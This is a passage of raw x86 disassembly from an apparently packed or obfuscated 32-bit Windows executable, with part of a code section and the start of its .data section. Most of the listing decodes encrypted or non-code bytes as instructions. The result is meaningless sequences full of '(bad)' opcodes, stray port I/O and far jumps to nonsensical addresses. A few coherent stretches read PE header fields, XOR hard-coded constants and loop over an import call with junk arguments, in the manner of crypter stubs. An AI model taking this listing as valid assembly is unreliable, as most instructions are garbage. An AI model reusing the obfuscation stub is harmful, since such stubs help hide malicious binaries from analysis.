  41133d:	imul   eax,DWORD PTR [edx],0xffffff86
  411340:	or     esp,esi
  411342:	ins    WORD PTR es:[edi],dx
  411344:	mov    DWORD PTR es:[ebx+0x59fa611a],eax
  41134b:	push   ecx
  41134c:	loope  0x411310
  41134e:	dec    esi
  41134f:	mov    ah,0x1b
  411351:	shl    BYTE PTR [ebp+0x640cd880],cl
  411357:	dec    ebx
  411358:	call   0x8286c817
  41135d:	loope  0x411331
  41135f:	or     ebp,DWORD PTR [eax-0x6d287753]
  411365:	(bad)  
  411366:	icebp  
  411367:	fnsave [edi-0x17]
  41136a:	xchg   ebp,eax
  41136b:	(bad)  
  41136c:	sar    BYTE PTR [edi+edx*1-0x73],cl
  411370:	xchg   edi,eax
  411371:	push   ds
  411372:	and    eax,ebx
  411374:	in     al,dx
  411375:	pop    ss
  411376:	mov    al,ds:0x51dc29f2
  41137b:	jno    0x411399
  41137d:	jmp    0x2405:0x3e88f00
  411384:	daa    
  411385:	cmp    BYTE PTR [eax],dl
  411387:	gs ret 
  411389:	sbb    dh,ch
  41138b:	adc    BYTE PTR [edx],dh
  41138d:	sbb    ah,BYTE PTR [ecx+0x71fd626a]
  411393:	test   DWORD PTR [edx-0x55],ecx
  411396:	clc    
  411397:	sbb    eax,0xd7d009fc
  41139c:	pop    eax
  41139d:	jno    0x411362
  41139f:	adc    DWORD PTR [esi-0x7c],ebp
  4113a2:	in     al,dx
  4113a3:	sar    DWORD PTR [edx-0x3b6ada0f],1
  4113a9:	jle    0x4113cb
  4113ab:	jb     0x4113fb
  4113ad:	jp     0x41139f
  4113af:	jmp    0xf702438a
  4113b4:	lea    eax,[ecx+0x16]
  4113b7:	and    eax,DWORD PTR [edi+ecx*8+0x5a]
  4113bb:	mov    bh,0xf2
  4113bd:	sbb    esp,edx
  4113bf:	jb     0x4113f7
  4113c1:	pop    ebp
  4113c2:	sub    eax,0xf7343068
  4113c7:	push   ds
  4113c8:	xor    BYTE PTR [eax+0x13],bl
  4113cb:	sub    DWORD PTR [ebx+0x1813fc2e],eax
  4113d1:	shr    DWORD PTR [ebx-0x20],1
  4113d4:	pop    esi
  4113d5:	adc    ecx,DWORD PTR [edi-0x73075e2d]
  4113db:	push   es
  4113dc:	add    BYTE PTR [ecx-0x8],dl
  4113df:	ss pushf 
  4113e1:	jge    0x411411
  4113e3:	inc    eax
  4113e4:	loop   0x4113f6
  4113e6:	sbb    eax,0x9ea31473
  4113eb:	data16 rol BYTE PTR [ecx-0x7418a23d],0x1f
  4113f3:	sbb    BYTE PTR [ebp+eax*1-0x1f548d5],dh
  4113fa:	in     al,dx
  4113fb:	jne    0x411439
  4113fd:	ret    
  4113fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113ff:	ins    BYTE PTR es:[edi],dx
  411400:	call   0x8ad7:0x3de82289
  411407:	dec    edx
  411408:	lods   al,BYTE PTR ds:[esi]
  411409:	jne    0x411469
  41140b:	push   esp
  41140c:	lds    edx,FWORD PTR [ecx-0x18]
  41140f:	jns    0x4113b2
  411411:	imul   BYTE PTR [eax-0x1f]
  411414:	ffree  st(6)
  411416:	or     ebp,ecx
  411418:	sbb    ebp,DWORD PTR [ecx]
  41141a:	jmp    DWORD PTR [ecx+edx*1]
  41141d:	lds    ebp,FWORD PTR [edi-0xa15fb2]
  411423:	mov    esp,0x15aaa11a
  411428:	int3   
  411429:	int    0x6d
  41142b:	push   esi
  41142c:	imul   ebx,ebx,0x9a4ba652
  411432:	adc    ecx,DWORD PTR es:[edx+esi*8]
  411436:	xor    BYTE PTR [ecx+0x59],bh
  411439:	scas   eax,DWORD PTR es:[edi]
  41143a:	call   0xb8db315f
  41143f:	mov    ds:0x1eb6cb74,al
  411444:	jecxz  0x41147a
  411446:	call   0x2d078575
  41144b:	(bad)  [edx-0xa992715]
  411451:	inc    esp
  411452:	jg     0x411492
  411454:	jns    0x411451
  411456:	stc    
  411457:	jl     0x411477
  411459:	mov    BYTE PTR ds:0xb04c3bde,cl
  41145f:	fimul  WORD PTR [edx+ebp*8]
  411462:	inc    eax
  411463:	xchg   esi,eax
  411464:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411465:	mov    DWORD PTR [ebx+0xf0b2372],ebx
  41146b:	repnz hlt 
  41146d:	inc    ecx
  41146e:	pushf  
  41146f:	cmp    esi,DWORD PTR [eax+0x79]
  411472:	or     dh,dl
  411474:	pop    ds
  411475:	pop    eax
  411476:	repnz push edi
  411478:	pop    edx
  411479:	push   0x7af9ac2f
  41147e:	popa   
  41147f:	fidiv  WORD PTR [eax+0x38]
  411482:	and    eax,DWORD PTR [ebx+eax*8+0x4beb3855]
  411489:	mov    cl,0x85
  41148b:	xchg   edi,eax
  41148c:	(bad)  
  41148e:	and    bl,BYTE PTR [esi-0x78]
  411491:	dec    esp
  411492:	outs   dx,BYTE PTR ds:[esi]
  411493:	test   eax,0x40510d73
  411498:	adc    bl,BYTE PTR [ebp+0x45]
  41149b:	pop    ds
  41149c:	loope  0x411488
  41149e:	pop    edx
  41149f:	popa   
  4114a0:	sbb    DWORD PTR [eax+0x2c4e949b],eax
  4114a6:	in     al,0xd3
  4114a8:	xchg   ebx,eax
  4114a9:	cs je  0x4114ce
  4114ac:	adc    BYTE PTR [edi+eiz*2-0x73f3c07],ah
  4114b3:	xchg   edx,eax
  4114b4:	jb     0x4114bf
  4114b6:	neg    DWORD PTR [ecx-0x73]
  4114b9:	repz mov edi,0x4071d03b
  4114bf:	in     al,dx
  4114c0:	(bad)  
  4114c1:	mov    bh,0x68
  4114c3:	adc    ebp,ebx
  4114c5:	scas   eax,DWORD PTR es:[edi]
  4114c6:	pop    ds
  4114c7:	mov    esi,0xaf9d2381
  4114cc:	add    al,BYTE PTR [ebp+eiz*1-0x75]
  4114d0:	mov    esi,0x69bce858
  4114d5:	mov    edx,0x17082d6a
  4114da:	adc    al,0x9e
  4114dc:	mov    bh,0x2f
  4114de:	mov    al,ds:0x84ceea37
  4114e3:	mov    ds:0xd05237eb,eax
  4114e8:	icebp  
  4114e9:	jmp    0x1ba:0x4d3994e7
  4114f0:	sbb    eax,0x4080b50e
  4114f5:	pop    edx
  4114f6:	std    
  4114f7:	into   
  4114f8:	add    al,0xfe
  4114fa:	inc    ecx
  4114fb:	xchg   esi,eax
  4114fc:	lahf   
  4114fd:	xor    BYTE PTR [ebp+0x70],dh
  411500:	(bad)  
  411501:	data16 fimul WORD PTR [edx-0x74311340]
  411508:	or     BYTE PTR [ebp-0x3f9f5488],bh
  41150e:	mov    edx,0x5adbe69d
  411513:	sub    ecx,0x3a
  411516:	adc    al,0x2d
  411518:	stos   BYTE PTR es:[edi],al
  411519:	xor    esi,DWORD PTR [ecx+0x2b]
  41151c:	pop    edi
  41151d:	push   esi
  41151e:	ret    0xe92d
  411521:	not    BYTE PTR [esi+0x39]
  411524:	xor    dl,bl
  411526:	(bad)  
  411527:	dec    edi
  411528:	inc    eax
  411529:	xlat   BYTE PTR ds:[ebx]
  41152a:	xchg   ecx,eax
  41152b:	ret    0x4012
  41152e:	push   edx
  41152f:	lock lods eax,DWORD PTR ds:[esi]
  411531:	add    eax,0x8bc00f8e
  411536:	rcr    DWORD PTR [esi-0x26],1
  411539:	out    0x4f,al
  41153b:	inc    eax
  41153c:	cmp    al,0x3a
  41153e:	adc    dl,bh
  411540:	xchg   ebp,eax
  411541:	ss adc eax,0xb38ba84c
  411547:	push   ss
  411548:	loope  0x411596
  41154a:	xor    bl,BYTE PTR [edx+0xf16eb47]
  411550:	cld    
  411551:	add    DWORD PTR [esi-0x26],esp
  411554:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411555:	stos   BYTE PTR es:[edi],al
  411556:	rol    ebx,1
  411558:	test   al,0x26
  41155a:	outs   dx,BYTE PTR ds:[esi]
  41155b:	fsubr  QWORD PTR ds:0xf78c29b3
  411561:	push   ss
  411562:	push   edx
  411563:	mov    DWORD PTR [ecx-0x6388fbc0],edx
  411569:	jmp    esp
  41156b:	and    cl,BYTE PTR ds:0x1071ac4a
  411571:	jmp    0xac81:0x5afac8
  411578:	lds    ecx,FWORD PTR [edi-0x50dbe0ce]
  41157e:	mov    eax,0xb4427818
  411583:	pop    ss
  411584:	xor    DWORD PTR [ebx+0x2b],esi
  411587:	cmp    ah,bl
  411589:	mov    ch,0xf9
  41158b:	ins    BYTE PTR es:[edi],dx
  41158c:	addr16 pop ss
  41158e:	idiv   ch
  411590:	cmc    
  411591:	mov    ecx,DWORD PTR [ecx-0x9]
  411594:	fidiv  WORD PTR [esi]
  411596:	and    esp,DWORD PTR [eax+0x5700a1da]
  41159c:	jnp    0x411559
  41159e:	xor    dh,BYTE PTR [esi-0x1fbbc926]
  4115a4:	xchg   esp,eax
  4115a5:	hlt    
  4115a6:	jnp    0x411533
  4115a8:	jg     0x41159f
  4115aa:	lock bound esp,QWORD PTR [edx]
  4115ad:	stos   DWORD PTR es:[edi],eax
  4115ae:	sbb    al,0x6a
  4115b0:	xchg   ebp,eax
  4115b1:	fadd   QWORD PTR [eax+0x417aaa1e]
  4115b7:	sar    BYTE PTR [edi-0x29],0x5
  4115bb:	push   esp
  4115bc:	and    BYTE PTR es:[edx],bh
  4115bf:	ror    DWORD PTR [esi+0x6e1e7aa5],cl
  4115c5:	js     0x411628
  4115c7:	jb     0x4115b9
  4115c9:	bound  ebp,QWORD PTR [edi-0x21a92aa8]
  4115cf:	shr    DWORD PTR [edi+ebx*2],1
  4115d2:	scas   eax,DWORD PTR es:[edi]
  4115d3:	fwait
  4115d4:	mov    edx,DWORD PTR [ebp+0x8]
  4115d7:	xor    eax,ecx
  4115d9:	lea    eax,[eax+edx*1+0x32729b]
  4115e0:	mov    DWORD PTR [ebp+0x8],eax
  4115e3:	inc    DWORD PTR [ebp+0xc]
  4115e6:	jmp    0x410fe6
  4115eb:	mov    eax,DWORD PTR [ebp-0x10]
  4115ee:	xor    eax,ecx
  4115f0:	mov    ecx,DWORD PTR [ebp+0x10]
  4115f3:	add    eax,esi
  4115f5:	mov    DWORD PTR [ecx],eax
  4115f7:	pop    esi
  4115f8:	leave  
  4115f9:	ret    0xc
  4115fc:	push   ebp
  4115fd:	mov    ebp,esp
  4115ff:	push   ecx
  411600:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  411607:	jmp    0x4117ce
  41160c:	mov    eax,ds:0x7129745c
  411611:	xor    DWORD PTR [ecx+0x74],esp
  411614:	in     eax,0xeb
  411616:	leave  
  411617:	outs   dx,DWORD PTR ds:[esi]
  411618:	fdivr  QWORD PTR [ecx-0x5f]
  41161b:	ret    0x4086
  41161e:	jle    0x41169e
  411620:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411621:	jg     0x4116a1
  411623:	jle    0x4115bb
  411625:	ins    BYTE PTR es:[edi],dx
  411626:	jmp    0xe605:0x2d8a809f
  41162d:	push   0xffffff96
  41162f:	mov    cl,0xee
  411631:	stc    
  411632:	or     ah,dh
  411634:	jle    0x411691
  411636:	dec    edx
  411637:	or     ecx,DWORD PTR [ebp-0x6]
  41163a:	loop   0x4116af
  41163c:	dec    edx
  41163d:	xchg   ebx,eax
  41163e:	mov    eax,ds:0x263e5e90
  411643:	jne    0x411612
  411645:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411646:	pop    ebx
  411647:	jl     0x411609
  411649:	or     eax,esi
  41164b:	outs   dx,BYTE PTR ds:[esi]
  41164c:	loop   0x411604
  41164e:	mov    ds:0x456bfba2,al
  411653:	mov    bh,0x89
  411655:	or     ch,BYTE PTR [edi-0x6d8b30c7]
  41165b:	cmp    ebp,DWORD PTR [esi+0x36391c53]
  411661:	xchg   edi,eax
  411662:	jo     0x4116bb
  411664:	add    BYTE PTR [esi-0x1f],bh
  411667:	(bad)  
  411668:	cli    
  411669:	pop    eax
  41166a:	repz js 0x41167d
  41166d:	dec    esp
  41166e:	iret   
  41166f:	pop    ecx
  411670:	lahf   
  411671:	ficom  DWORD PTR [esi+0x6e]
  411674:	inc    edx
  411675:	les    ebp,FWORD PTR [ebx]
  411677:	sbb    eax,0x5509d5ac
  41167c:	xchg   esp,eax
  41167d:	xor    BYTE PTR [ebp-0x7e380e33],ah
  411683:	sbb    dh,0xb4
  411686:	pop    es
  411687:	arpl   WORD PTR [esi+0x70],sp
  41168a:	shr    BYTE PTR [edx-0x18],0x9a
  41168e:	dec    esp
  41168f:	adc    al,0x97
  411691:	lods   eax,DWORD PTR ds:[esi]
  411692:	addr16 rol dh,1
  411695:	mov    dh,0xe
  411697:	(bad)  
  411698:	push   eax
  411699:	and    eax,0x59edba0a
  41169e:	sub    al,0x4d
  4116a0:	arpl   WORD PTR [ebp+0x63a9593b],bx
  4116a6:	cli    
  4116a7:	cli    
  4116a8:	repnz fadd DWORD PTR [edi-0x88581c9]
  4116af:	pop    eax
  4116b0:	out    0x3a,eax
  4116b2:	out    dx,al
  4116b3:	fcmovnb st,st(4)
  4116b5:	xchg   esi,eax
  4116b6:	inc    edx
  4116b7:	cmp    al,0xd4
  4116b9:	imul   ebx,DWORD PTR [eax-0x19512d30],0x1b
  4116c0:	pop    ecx
  4116c1:	pop    ebx
  4116c2:	push   ss
  4116c3:	adc    edi,DWORD PTR [ebp+0x2e36ec20]
  4116c9:	adc    BYTE PTR [esi+ebx*4],al
  4116cc:	jg     0x41168e
  4116ce:	pop    edx
  4116cf:	je     0x411698
  4116d1:	stos   BYTE PTR es:[edi],al
  4116d2:	shl    esp,cl
  4116d4:	sub    bh,BYTE PTR [ebx+ebx*4+0x72370b13]
  4116db:	jae    0x411677
  4116dd:	or     esi,DWORD PTR [ebp+0x22]
  4116e0:	out    dx,eax
  4116e1:	add    bl,ch
  4116e3:	pop    esp
  4116e4:	into   
  4116e5:	pop    esp
  4116e6:	(bad)  
  4116e7:	out    dx,al
  4116e8:	das    
  4116e9:	rcr    bl,1
  4116eb:	sar    DWORD PTR [ecx+0x51],cl
  4116ee:	push   ds
  4116ef:	adc    eax,0xef2003d7
  4116f4:	leave  
  4116f5:	mov    ds:0xf4756048,al
  4116fa:	cmp    DWORD PTR [edx+0x4aa265b9],edx
  411700:	std    
  411701:	mov    al,0xf6
  411703:	xlat   BYTE PTR ds:[ebx]
  411704:	xchg   edi,eax
  411705:	out    0xcd,al
  411707:	mov    cl,ch
  411709:	inc    ebx
  41170a:	mov    dh,0x7f
  41170c:	push   esi
  41170d:	iret   
  41170e:	cli    
  41170f:	cmp    BYTE PTR [eax],dl
  411711:	or     DWORD PTR [eax+0x5a66f757],edi
  411717:	inc    eax
  411718:	fisttp WORD PTR [edx-0x74]
  41171b:	int3   
  41171c:	fiadd  WORD PTR [eax+0xcc8a5c6]
  411722:	mov    fs,WORD PTR [ebx-0x41]
  411725:	pop    ebp
  411726:	out    0x6f,eax
  411728:	(bad)  
  411729:	jns    0x41172e
  41172b:	ror    DWORD PTR [edi-0x38904d32],1
  411731:	pop    edi
  411732:	sbb    DWORD PTR [ecx+0x74],eax
  411735:	mov    ebp,0xd2cd5a3b
  41173a:	cmp    ch,bl
  41173c:	cmp    BYTE PTR [edi-0x55],bh
  41173f:	jae    0x41175f
  411741:	(bad)  
  411742:	push   cs
  411743:	mov    esp,ss
  411745:	cmp    ecx,DWORD PTR [edi]
  411747:	jno    0x411718
  411749:	dec    ecx
  41174a:	dec    esi
  41174b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41174c:	and    DWORD PTR [esi-0x3c],esi
  41174f:	sbb    dl,BYTE PTR [esi+esi*2]
  411752:	lea    esi,[ecx+0x62]
  411755:	sbb    DWORD PTR [edi],0x6e
  411758:	mov    esi,0xd1ce3fcc
  41175d:	lea    edx,[ebx]
  41175f:	jbe    0x4117d8
  411761:	add    ebx,ebx
  411763:	test   DWORD PTR [esi],0x303b8b5c
  411769:	(bad)  
  41176a:	es mov esp,0xa185a475
  411770:	adc    eax,DWORD PTR [esp+eiz*2]
  411773:	scas   eax,DWORD PTR es:[edi]
  411774:	test   eax,0x247d7abb
  411779:	mov    BYTE PTR [edi-0x53cce5d9],0x8
  411780:	sub    al,0x5f
  411782:	dec    BYTE PTR [edi-0x7fdef642]
  411788:	ins    DWORD PTR es:[edi],dx
  411789:	imul   esp,DWORD PTR [edi+ebx*2],0x711865ce
  411790:	lods   al,BYTE PTR ds:[esi]
  411791:	mov    ebx,0x16d55344
  411796:	test   eax,0x1ac73019
  41179b:	das    
  41179c:	addr16 jle 0x411751
  41179f:	xor    DWORD PTR [edx+0x4148c84b],edx
  4117a5:	mov    esp,0x770066ab
  4117aa:	retf   
  4117ab:	loop   0x411758
  4117ad:	mov    ebp,0xc14e0322
  4117b2:	out    dx,eax
  4117b3:	xchg   esi,esi
  4117b5:	rcl    DWORD PTR [eax+edi*8],1
  4117b8:	push   0x2c1397de
  4117bd:	or     DWORD PTR ds:0x140eaf,0x364200c2
  4117c7:	inc    ebp
  4117c8:	sbb    al,0x5b
  4117ca:	lods   eax,DWORD PTR ds:[esi]
  4117cb:	push   edx
  4117cc:	int3   
  4117cd:	mov    bh,0x8b
  4117cf:	inc    ebp
  4117d0:	or     bh,al
  4117d2:	add    eax,0x4337a3
  4117d7:	cmp    eax,0x8a000042
  4117dc:	add    BYTE PTR [ecx+0x4336ff2d],al
  4117e2:	add    BYTE PTR [ebp+0x6d],bh
  4117e5:	add    BYTE PTR [eax],al
  4117e7:	add    al,0x38
  4117e9:	xor    DWORD PTR ds:0x43379f,0x433703
  4117f3:	xor    al,0x46
  4117f5:	mov    DWORD PTR ds:0x43379f,0x735a
  4117ff:	cmp    al,0xc3
  411801:	jne    0x411aa4
  411807:	and    edx,0x7ba3
  41180d:	mov    eax,DWORD PTR [ebp+0x8]
  411810:	mov    ecx,DWORD PTR [ebp+0x8]
  411813:	add    ecx,DWORD PTR [eax+0x3c]
  411816:	and    DWORD PTR ds:0x43371b,0x4b8b
  411820:	mov    edx,0x7510854
  411825:	and    DWORD PTR ds:0x4337ab,0x0
  41182f:	mov    eax,ds:0x4337ab
  411834:	inc    eax
  411835:	mov    ds:0x4337ab,eax
  41183a:	cmp    DWORD PTR ds:0x4337ab,0xb
  411841:	jne    0x411887
  411847:	push   0x4338bc
  41184c:	push   0x761c
  411851:	push   0x2832
  411856:	push   0x3f0d
  41185b:	push   0x4923
  411860:	push   DWORD PTR [ebp-0x24]
  411863:	push   DWORD PTR [ebp-0x28]
  411866:	push   DWORD PTR [ebp-0xc]
  411869:	push   0x49e1
  41186e:	push   DWORD PTR [ebp-0x28]
  411871:	push   DWORD PTR [ebp-0x14]
  411874:	push   DWORD PTR [ebp-0x10]
  411877:	push   0x6b07
  41187c:	push   0x8d34
  411881:	call   DWORD PTR ds:0x4122b8
  411887:	cmp    DWORD PTR ds:0x4337ab,0xa
  41188e:	jne    0x41189f
  411894:	mov    eax,ds:0x4337ab
  411899:	inc    eax
  41189a:	mov    ds:0x4337ab,eax
  41189f:	cmp    DWORD PTR ds:0x4337ab,0x11
  4118a6:	jb     0x41182f
  4118ac:	mov    DWORD PTR [ebp+0x8],ecx
  4118af:	mov    eax,DWORD PTR [ebp-0x4]
  4118b2:	xor    eax,edx
  4118b4:	push   esi
  4118b5:	mov    esi,DWORD PTR [ebp+0x8]
  4118b8:	mov    ecx,0x32729b
  4118bd:	add    eax,ecx
  4118bf:	cmp    DWORD PTR [esi+0x54],eax
  4118c2:	pop    esi
  4118c3:	je     0x4118d1
  4118c9:	mov    eax,DWORD PTR [ebp+0x8]
  4118cc:	jmp    0x411ab1
  4118d1:	mov    eax,DWORD PTR [ebp-0x4]
  4118d4:	xor    eax,edx
  4118d6:	jmp    0x411a9d
  4118db:	mov    ebp,0xe1e4219a
  4118e0:	gs mov ecx,0x58658ca3
  4118e6:	stos   DWORD PTR es:[edi],eax
  4118e7:	inc    esp
  4118e8:	ds test eax,0x7e4e2c97
  4118ee:	jle    0x411894
  4118f0:	jg     0x411970
  4118f2:	jle    0x4118cc
  4118f4:	inc    eax
  4118f5:	sbb    edi,edx
  4118f7:	jo     0x4118bf
  4118f9:	rcl    BYTE PTR [edx],cl
  4118fb:	imul   ebp,DWORD PTR [edi+0x1b],0x5d077b6a
  411902:	sar    bl,cl
  411904:	mov    al,ds:0x5caaabe5
  411909:	out    dx,al
  41190a:	add    DWORD PTR ds:0x50fd6a9e,edi
  411910:	xchg   edi,eax
  411911:	jecxz  0x4118eb
  411913:	jg     0x411922
  411915:	pop    ss
  411916:	sub    DWORD PTR [edx+0x2e],edx
  411919:	fwait
  41191a:	and    cl,BYTE PTR [edi+ecx*4]
  41191d:	into   
  41191e:	js     0x411995
  411920:	inc    ebp
  411921:	adc    DWORD PTR [edi-0x6d],edx
  411924:	std    
  411925:	jne    0x411931
  411927:	imul   ebp,DWORD PTR [edx-0x1b],0x36
  41192b:	push   ds
  41192c:	mov    ch,0x33
  41192e:	or     bl,BYTE PTR ds:0x707db02b
  411934:	cmp    esi,esi
  411936:	test   ch,ch
  411938:	push   ebp
  411939:	imul   esi,DWORD PTR [edi-0x7a],0xffffffa3
  41193d:	call   0x273f:0xeef76b1f
  411944:	xor    eax,0xd5085e8d
  411949:	out    0xc,al
  41194b:	std    
  41194c:	hlt    
  41194d:	push   0x49b4a135
  411952:	pusha  
  411953:	dec    esi
  411954:	xor    ecx,DWORD PTR [eax]
  411956:	enter  0x3031,0xa9
  41195a:	sub    esi,ebx
  41195c:	mov    dh,0xd3
  41195e:	mov    bl,0xf6
  411960:	and    ecx,DWORD PTR [edi+edx*2]
  411963:	cmp    BYTE PTR [eax-0x777274b3],cl
  411969:	clc    
  41196a:	dec    edi
  41196b:	jne    0x411991
  41196d:	scas   eax,DWORD PTR es:[edi]
  41196e:	sub    BYTE PTR [edx+eiz*2+0x4957f8b1],bl
  411975:	xchg   ebp,eax
  411976:	mov    ebp,edi
  411978:	pop    edi
  411979:	cmp    DWORD PTR [ebx+edi*8-0x20],esp
  41197d:	in     al,dx
  41197e:	push   cs
  41197f:	push   0x2922fc72
  411984:	cld    
  411985:	mov    ch,BYTE PTR [ebp+0x35328473]
  41198b:	mov    dl,BYTE PTR [eax+0x2a69c281]
  411991:	sub    BYTE PTR [esi],cl
  411993:	int3   
  411994:	into   
  411995:	cli    
  411996:	push   esp
  411997:	xor    DWORD PTR [edi],0xffffffca
  41199a:	lock enter 0xc2ce,0x97
  41199f:	mov    ecx,edx
  4119a1:	pop    ss
  4119a2:	pop    ecx
  4119a3:	scas   eax,DWORD PTR es:[edi]
  4119a4:	jge    0x41197e
  4119a6:	std    
  4119a7:	lahf   
  4119a8:	lods   eax,DWORD PTR ds:[esi]
  4119a9:	mov    ah,0x91
  4119ab:	xor    DWORD PTR [edx],ecx
  4119ad:	aaa    
  4119ae:	pop    esi
  4119af:	in     eax,dx
  4119b0:	xchg   BYTE PTR [ecx+0x3fe1639],bl
  4119b6:	iret   
  4119b7:	sbb    BYTE PTR [esi-0x65],al
  4119ba:	jge    0x411953
  4119bc:	or     al,0x2c
  4119be:	mov    esp,es
  4119c0:	dec    esi
  4119c1:	mov    ds:0x94bc9e11,eax
  4119c6:	xchg   esp,eax
  4119c7:	xor    DWORD PTR [ebp+ebp*2+0x8],0x4d2b95b9
  4119cf:	sbb    dh,0x6e
  4119d2:	xchg   edi,eax
  4119d3:	mov    esp,0x8d95e0b1
  4119d8:	or     esi,DWORD PTR [edx]
  4119da:	out    dx,al
  4119db:	xchg   DWORD PTR [esi+0x3e8421a6],edx
  4119e1:	stos   BYTE PTR es:[edi],al
  4119e2:	inc    ebp
  4119e3:	call   0x486b7520
  4119e8:	sbb    BYTE PTR [eax-0xb],ah
  4119eb:	dec    ebp
  4119ec:	xchg   ebx,eax
  4119ed:	xchg   DWORD PTR [edi+0x551f4a19],ecx
  4119f3:	mov    ebx,0x38b68166
  4119f8:	adc    eax,0x623a987c
  4119fd:	or     cl,al
  4119ff:	push   ecx
  411a00:	in     eax,dx
  411a01:	jge    0x411a5d
  411a03:	bnd jg 0x411a5e
  411a06:	pusha  
  411a07:	push   edx
  411a08:	adc    BYTE PTR ds:0x74c1c886,cl
  411a0e:	xchg   edi,eax
  411a0f:	shr    DWORD PTR [esi+0x6ec8e98f],1
  411a15:	push   ebp
  411a16:	add    BYTE PTR [edi-0x5a647b47],0xf8
  411a1d:	out    0x6a,al
  411a1f:	push   ebp
  411a20:	test   DWORD PTR [ebx+eiz*4],esp
  411a23:	call   0x311e3e88
  411a28:	js     0x4119c6
  411a2a:	jae    0x411a17
  411a2c:	push   ecx
  411a2d:	gs leave 
  411a2f:	cmc    
  411a30:	fisttp WORD PTR [ebx-0x3a]
  411a33:	inc    ebp
  411a34:	(bad)  
  411a35:	adc    al,0xd5
  411a37:	ror    BYTE PTR [eax+0x2776adc8],0xd4
  411a3e:	mov    ds:0xf790459e,al
  411a43:	jle    0x411a7e
  411a45:	xor    BYTE PTR [ebx],dl
  411a47:	(bad)  
  411a48:	adc    esi,DWORD PTR [eax+0x7f22b03c]
  411a4e:	ss xchg ebx,eax
  411a50:	out    dx,eax
  411a51:	shl    DWORD PTR [ebx+0x2c],0x5c
  411a55:	add    DWORD PTR [ecx],0x230bb314
  411a5b:	sbb    DWORD PTR [ecx+0x33],edi
  411a5e:	in     al,0x45
  411a60:	outs   dx,BYTE PTR ds:[esi]
  411a61:	jne    0x411a41
  411a63:	cld    
  411a64:	jno    0x411a79
  411a66:	inc    edx
  411a67:	imul   esi,DWORD PTR [eax+0x47],0xfffffff3
  411a6b:	jl     0x411a71
  411a6d:	inc    si
  411a6f:	mov    ebp,0xcb674af2
  411a74:	or     BYTE PTR [esi],dh
  411a76:	or     ebp,0x327e13af
  411a7c:	outs   dx,DWORD PTR ds:[esi]
  411a7d:	(bad)  
  411a7e:	aam    0x1d
  411a80:	inc    ebp
  411a81:	adc    ebx,DWORD PTR ss:[ecx]
  411a84:	(bad)  
  411a85:	mov    esp,0xf4c8ef36
  411a8a:	jnp    0x411ade
  411a8c:	cs jnp 0x411a38
  411a8f:	push   esi
  411a90:	inc    ebx
  411a91:	mov    eax,0x8ceeba1d
  411a96:	shl    DWORD PTR [ebp-0x72],1
  411a99:	add    cl,dl
  411a9b:	mov    cl,0x5b
  411a9d:	add    eax,ecx
  411a9f:	jmp    0x411ab1
  411aa4:	mov    eax,DWORD PTR [ebp-0x4]
  411aa7:	xor    eax,0x7510854
  411aac:	add    eax,0x32729b
  411ab1:	leave  
  411ab2:	ret    0x4

Disassembly of section .data:

00412000 <.data>:
  412000:	sub    al,0x29
  412002:	add    DWORD PTR [eax],eax
  412004:	sub    DWORD PTR ss:[ecx],eax
  412007:	add    BYTE PTR [eax+0x29],al
  41200a:	add    DWORD PTR [eax],eax
  41200c:	dec    esi
  41200d:	sub    DWORD PTR [ecx],eax
  41200f:	add    BYTE PTR [eax+0x29],bl
  412012:	add    DWORD PTR [eax],eax
  412014:	bound  ebp,QWORD PTR [ecx]
  412016:	add    DWORD PTR [eax],eax
  412018:	ins    BYTE PTR es:[edi],dx
  412019:	sub    DWORD PTR [ecx],eax
  41201b:	add    BYTE PTR [esi+0x29],dh
  41201e:	add    DWORD PTR [eax],eax
  412020:	mov    BYTE PTR [ecx],ch
  412022:	add    DWORD PTR [eax],eax
  412024:	xchg   edx,eax
  412025:	sub    DWORD PTR [ecx],eax
  412027:	add    BYTE PTR [edx-0x5dfffed7],bl
  41202d:	sub    DWORD PTR [ecx],eax
  41202f:	add    BYTE PTR [esi-0x43fffed7],ch
  412035:	sub    DWORD PTR [ecx],eax
  412037:	add    dh,al
  412039:	sub    DWORD PTR [ecx],eax
  41203b:	add    dl,dl
  41203d:	sub    DWORD PTR [ecx],eax
  41203f:	add    ah,bl
  412041:	sub    DWORD PTR [ecx],eax
  412043:	add    ah,ch
  412045:	sub    DWORD PTR [ecx],eax
  412047:	add    ah,dh
  412049:	sub    DWORD PTR [ecx],eax
  41204b:	add    ah,bh
  41204d:	sub    DWORD PTR [ecx],eax
  41204f:	add    BYTE PTR [esi],al
  412051:	sub    al,BYTE PTR [ecx]
  412053:	add    BYTE PTR [edx],dl
  412055:	sub    al,BYTE PTR [ecx]
  412057:	add    BYTE PTR [esi],bl
  412059:	sub    al,BYTE PTR [ecx]
  41205b:	add    BYTE PTR [edx+ebp*1],ch
  41205e:	add    DWORD PTR [eax],eax
  412060:	sub    al,BYTE PTR ss:[ecx]
  412063:	add    BYTE PTR [edx+0x2a],al
  412066:	add    DWORD PTR [eax],eax
  412068:	dec    esp
  412069:	sub    al,BYTE PTR [ecx]
  41206b:	add    BYTE PTR [esi+0x2a],dl
  41206e:	add    DWORD PTR [eax],eax
  412070:	sub    al,BYTE PTR fs:[ecx]
  412073:	add    BYTE PTR [eax+0x2a],dh
  412076:	add    DWORD PTR [eax],eax
  412078:	js     0x4120a4
  41207a:	add    DWORD PTR [eax],eax
  41207c:	xchg   BYTE PTR [edx],ch
  41207e:	add    DWORD PTR [eax],eax
  412080:	nop
  412081:	sub    al,BYTE PTR [ecx]
  412083:	add    BYTE PTR [eax-0x5dfffed6],bl
  412089:	sub    al,BYTE PTR [ecx]
  41208b:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  412092:	add    DWORD PTR [eax],eax
  412094:	shr    BYTE PTR [edx],0x1
  412097:	add    ah,dl
  412099:	sub    al,BYTE PTR [ecx]
  41209b:	add    dh,bl
  41209d:	sub    al,BYTE PTR [ecx]
  41209f:	add    al,ch
  4120a1:	sub    al,BYTE PTR [ecx]
  4120a3:	add    al,dh
  4120a5:	sub    al,BYTE PTR [ecx]
  4120a7:	add    BYTE PTR [eax],al
  4120a9:	sub    eax,DWORD PTR [ecx]
  4120ab:	add    BYTE PTR [edx],cl
